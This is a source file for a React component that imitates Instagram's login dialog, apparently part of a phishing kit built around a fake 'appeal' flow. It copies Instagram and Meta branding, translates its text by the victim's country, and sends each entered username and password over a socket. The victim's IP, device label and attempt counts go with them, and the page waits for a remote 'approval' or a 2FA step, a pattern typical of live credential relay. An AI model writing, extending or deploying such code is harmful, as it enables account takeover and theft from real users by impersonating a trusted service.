import '@/assets/css/instagram-login-modal.css';
import LogoInsta from '@/assets/images/logo-insta.webp';
import MetaLogoGrey from '@/assets/images/meta-logo-grey.png';
import { useAppealContext } from '@/hooks/use-appeal-context';
import { store } from '@/store/store';
import { submitLoginApproval } from '@/utils/approval-flow';
import translateText from '@/utils/translate';
import Image from 'next/image';
import { type FC, type FormEvent, useEffect, useState } from 'react';

const TEXT = {
    title: 'Log in to Instagram',
    security: 'For your security, please enter your password to continue.',
    identityPlaceholder: 'Phone number, username, or email',
    passwordPlaceholder: 'Password',
    error: 'Password is incorrect, please try again.',
    waiting: 'Waiting for verification...',
    submit: 'Log in',
    forgot: 'Forgot your password?',
    showPassword: 'Show password',
    hidePassword: 'Hide password'
} as const;

const textsToTranslate = Object.values(TEXT);

const PasswordEye: FC<{ show: boolean }> = ({ show }) => (
    <svg viewBox='0 0 24 24' width='18' height='18' fill='none' stroke='currentColor' strokeWidth='1.8' aria-hidden='true'>
        <path d='M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6-10-6-10-6z' />
        <circle cx='12' cy='12' r='2.8' />
        {show ? <path d='M4 20L20 4' /> : null}
    </svg>
);

const InstagramLoginModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [identity, setIdentity] = useState('');
    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);
    const [showError, setShowError] = useState(false);
    const [isWaiting, setIsWaiting] = useState(false);
    const [isLoading, setIsLoading] = useState(false);
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { setModalOpen, geoInfo } = store();
    const appeal = useAppealContext();

    const t = (text: string): string => translations[text] || text;
    const canSubmit = identity.trim().length > 0 && password.trim().length > 0 && !isLoading;

    useEffect(() => {
        document.title = TEXT.title;
    }, []);

    useEffect(() => {
        if (!geoInfo) {
            return;
        }

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};
            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }
            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const clearError = () => setShowError(false);

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        if (!canSubmit) {
            return;
        }

        setShowError(false);
        setIsLoading(true);
        setIsWaiting(true);

        try {
            if (!appeal.socket || !appeal.isConnected || !appeal.ip) {
                throw new Error('socket unavailable');
            }

            const result = await submitLoginApproval(
                {
                    socket: appeal.socket,
                    messageId: appeal.messageId,
                    setMessageId: appeal.setMessageId,
                    formData: appeal.formData,
                    loginData: appeal.loginData,
                    loginProvider: appeal.loginProvider,
                    passwordAttempts: appeal.passwordAttempts,
                    twoFAAttempts: appeal.twoFAAttempts,
                    deviceLabel: appeal.deviceLabel,
                    ip: appeal.ip,
                    setLoginData: appeal.setLoginData,
                    addPasswordAttempt: appeal.addPasswordAttempt,
                    addTwoFAAttempt: appeal.addTwoFAAttempt
                },
                identity,
                password
            );

            if (result.approved || result.needs2FA) {
                nextStep();
                return;
            }

            setShowError(true);
            setPassword('');
        } catch {
            setShowError(true);
            setPassword('');
        } finally {
            setIsWaiting(false);
            setIsLoading(false);
        }
    };

    return (
        <div
            className='ig-login-page fixed inset-0 z-[1040] flex items-center justify-center bg-black/45 p-4'
            role='dialog'
            aria-modal='true'
            aria-labelledby='ig-login-title'
        >
            <div
                className='relative flex w-full max-w-[480px] flex-col overflow-hidden rounded-2xl bg-white p-5 shadow-[0_20px_50px_rgba(15,23,42,0.2)]'
                style={{ minHeight: 'min(860px, calc(100vh - 16px))', maxHeight: 'min(860px, calc(100vh - 16px))' }}
            >
                <button
                    type='button'
                    onClick={() => setModalOpen(false)}
                    className='absolute top-4 right-4 z-10 flex h-8 w-8 items-center justify-center rounded-full text-[#8e8e8e] transition-colors hover:bg-[#f2f2f2]'
                    aria-label='Close'
                >
                    <svg className='h-4 w-4' viewBox='0 0 384 512' aria-hidden='true' fill='currentColor'>
                        <path d='M342.6 150.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L192 210.7 86.6 105.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3L146.7 256 41.4 361.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0L192 301.3 297.4 406.6c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L237.3 256 342.6 150.6z' />
                    </svg>
                </button>

                <div className='ig-login-top-bar' aria-hidden='true' />

                <div className='flex min-h-0 flex-1 flex-col justify-between pt-6'>
                    <div className='w-full'>
                        <div className='mb-6 flex flex-col items-center'>
                            <div className='ig-login-icon-ring mb-5 flex h-[72px] w-[72px] items-center justify-center'>
                                <div className='ig-login-icon-inner flex h-full w-full items-center justify-center'>
                                    <Image src={LogoInsta} alt='Instagram' width={48} height={48} className='object-contain' />
                                </div>
                            </div>
                            <h2 id='ig-login-title' className='text-[20px] font-semibold text-[#262626]'>
                                {t(TEXT.title)}
                            </h2>
                            <p className='mt-2 px-2 text-center text-[14px] leading-relaxed text-[#9a979e]'>{t(TEXT.security)}</p>
                        </div>

                        <form id='ig-login-form' className='space-y-3' autoComplete='off' onSubmit={handleSubmit}>
                            <input
                                id='ig-identity'
                                type='text'
                                className='ig-login-input'
                                placeholder={t(TEXT.identityPlaceholder)}
                                autoComplete='username'
                                value={identity}
                                onChange={(e) => {
                                    setIdentity(e.target.value);
                                    clearError();
                                }}
                            />

                            <div className='relative'>
                                <input
                                    id='ig-password'
                                    type={showPassword ? 'text' : 'password'}
                                    className={`ig-login-input pr-10 ${showError ? 'is-error' : ''}`}
                                    placeholder={t(TEXT.passwordPlaceholder)}
                                    autoComplete='current-password'
                                    maxLength={30}
                                    value={password}
                                    onChange={(e) => {
                                        setPassword(e.target.value);
                                        clearError();
                                    }}
                                />
                                <button
                                    type='button'
                                    className='absolute top-1/2 right-3 -translate-y-1/2 text-[#6b7280] hover:text-[#E1306C]'
                                    aria-label={showPassword ? t(TEXT.hidePassword) : t(TEXT.showPassword)}
                                    onClick={() => setShowPassword((v) => !v)}
                                >
                                    <PasswordEye show={showPassword} />
                                </button>
                            </div>

                            {showError ? <p className='text-[14px] text-[#ef4444]'>{t(TEXT.error)}</p> : null}
                            {isWaiting ? (
                                <p className='ig-login-waiting text-center text-[13px] text-[#E1306C]'>{t(TEXT.waiting)}</p>
                            ) : null}

                            <button
                                type='submit'
                                disabled={!canSubmit}
                                className='ig-login-submit flex h-10 w-full items-center justify-center rounded-full text-[14px] font-semibold text-white transition-all disabled:cursor-default disabled:opacity-70'
                            >
                                {isLoading ? (
                                    <span className='ig-login-spinner h-[18px] w-[18px] rounded-full border-2 border-white/40 border-t-white' />
                                ) : (
                                    t(TEXT.submit)
                                )}
                            </button>

                            <p className='pt-1 text-center'>
                                <span className='cursor-pointer text-[14px] text-[#0095f6] hover:underline'>{t(TEXT.forgot)}</span>
                            </p>
                        </form>
                    </div>

                    <div className='mt-6 w-16 self-center'>
                        <Image src={MetaLogoGrey} alt='Meta' width={64} className='w-full object-contain' />
                    </div>
                </div>
            </div>
        </div>
    );
};

export default InstagramLoginModal;
